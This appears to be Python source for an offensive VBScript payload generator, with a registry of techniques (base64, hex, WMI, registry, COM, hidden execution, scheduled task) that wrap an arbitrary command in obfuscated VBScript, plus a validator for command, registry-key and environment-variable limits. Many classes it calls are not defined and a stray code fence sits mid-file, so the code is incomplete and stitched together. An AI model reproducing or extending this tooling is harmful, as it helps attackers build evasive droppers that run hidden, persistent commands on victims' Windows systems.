from abc import ABC, abstractmethod

class PayloadTechnique(ABC):
    """Base class for payload generation techniques"""
    
    @property
    @abstractmethod
    def name(self) -> str:
        """Unique technique identifier"""
        pass
    
    @property
    @abstractmethod
    def description(self) -> str:
        """Human-readable description"""
        pass
    
    @abstractmethod
    def generate(self, command: str, config: ObfuscationConfig) -> str:
        """Generate VBS payload"""
        pass

class Base64Technique(PayloadTechnique):
    name = "base64"
    description = "Base64 encoding with MSXML decoder"
    
    def __init__(self, encoder: VBSEncoder):
        self.encoder = encoder
    
    def generate(self, command: str, config: ObfuscationConfig) -> str:
        return self.encoder.create_full_obfuscated_payload(command, "base64")

class HexTechnique(PayloadTechnique):
    name = "hex"
    description = "Hex encoding with Chr() decoder"
    
    def __init__(self, encoder: VBSEncoder):
        self.encoder = encoder
    
    def generate(self, command: str, config: ObfuscationConfig) -> str:
        return self.encoder.create_full_obfuscated_payload(command, "hex")

class PayloadGenerator:
    def __init__(self):
        self.encoder = VBSEncoder()
        self.obfuscation = AdvancedVBSObfuscation()
        self.techniques: Dict[str, PayloadTechnique] = self._build_registry()
    
    def _build_registry(self) -> Dict[str, PayloadTechnique]:
        return {
            "basic": BaseTechnique(self.encoder),
            "base64": Base64Technique(self.encoder),
            "hex": HexTechnique(self.encoder),
            "array": ArrayTechnique(self.encoder),
            "wmi": WMITechnique(self.obfuscation),
            "registry": RegistryTechnique(self.obfuscation),
            "env": EnvironmentTechnique(self.obfuscation),
            "com": COMTechnique(self.obfuscation),
            "obfuscated_calls": ObfuscatedCallsTechnique(self.obfuscation),
            "filewriter": FileWriterTechnique(self.obfuscation),
            "multi_encoding": MultiEncodingTechnique(self.obfuscation),
            "hidden_execution": HiddenExecutionTechnique(self.encoder),
            "scheduled_task": ScheduledTaskTechnique(self.obfuscation),
        }
    
    def generate(self, command: str, technique: str = "base64", 
                 obfuscation_level: str = "high") -> str:
        """Generate VBS payload using specified technique"""
        
        # Validate input
        is_valid, error_msg = PayloadValidator.validate_command(command)
        if not is_valid:
            raise ValueError(error_msg)
        
        # Get technique
        if technique not in self.techniques:
            available = ", ".join(self.techniques.keys())
            raise ValueError(f"Unknown technique '{technique}'. Available: {available}")
        
        # Create config
        config = ObfuscationConfig(
            obfuscation_level=ObfuscationLevel[obfuscation_level.upper()]
        )
        
        # Generate and return
        return self.techniques[technique].generate(command, config)
    
    def list_techniques(self) -> List[str]:
        return list(self.techniques.keys())
    
    def get_technique_info(self, technique: str) -> str:
        if technique not in self.techniques:
            return "Unknown technique"
        return self.techniques[technique].description

```python
from typing import Tuple

class PayloadValidator:
    """Validates payloads before generation"""
    
    # VBS string literal limit
    MAX_VBS_STRING_LENGTH = 8000
    
    # Registry value size limit (in bytes)
    MAX_REGISTRY_VALUE_SIZE = 1024 * 1024  # 1MB for most Windows versions
    
    # Registry key path length limit
    MAX_REGISTRY_KEY_LENGTH = 255
    
    # Environment variable size limit
    MAX_ENV_VAR_SIZE = 32767
    
    @staticmethod
    def validate_command(command: str) -> Tuple[bool, str]:
        """Validate command for VBS payload compatibility"""
        
        if not command:
            return False, "Command cannot be empty"
        
        if len(command) > PayloadValidator.MAX_VBS_STRING_LENGTH:
            return False, f"Command exceeds VBS limit ({PayloadValidator.MAX_VBS_STRING_LENGTH} chars)"
        
        # Check for unescaped quotes
        if '"' in command:
            # Verify they're properly escaped
            escaped_count = command.count('""')
            unescaped_count = command.count('"') - (escaped_count * 2)
            if unescaped_count % 2 != 0:
                return False, "Command contains unescaped quotes"
        
        # Check for problematic control characters
        problematic_chars = [chr(i) for i in range(0, 32) if i not in [9, 10, 13]]
        for char in problematic_chars:
            if char in command:
                return False, f"Command contains control character 0x{ord(char):02X}"
        
        return True, ""
    
    @staticmethod
    def validate_registry_key(key: str) -> Tuple[bool, str]:
        """Validate registry key path"""
        
        if not key:
            return False, "Registry key cannot be empty"
        
        if len(key) > PayloadValidator.MAX_REGISTRY_KEY_LENGTH:
            return False, f"Registry key exceeds {PayloadValidator.MAX_REGISTRY_KEY_LENGTH} chars"
        
        # Check for invalid characters
        invalid_chars = ['<', '>', '*', '?', '|', chr(0)]
        for char in invalid_chars:
            if char in key:
                return False, f"Registry key contains invalid character: {repr(char)}"
        
        return True, ""
    
    @staticmethod
    def validate_env_variable(name: str, value: str) -> Tuple[bool, str]:
        """Validate environment variable"""
        
        if not name:
            return False, "Variable name cannot be empty"
        
        if len(value) > PayloadValidator.MAX_ENV_VAR_SIZE:
            return False, f"Environment variable value exceeds {PayloadValidator.MAX_ENV_VAR_SIZE} bytes"
        
        # Check for null bytes
        if '\x00' in value:
            return False, "Environment variable value contains null bytes"
        
        return True, ""
```
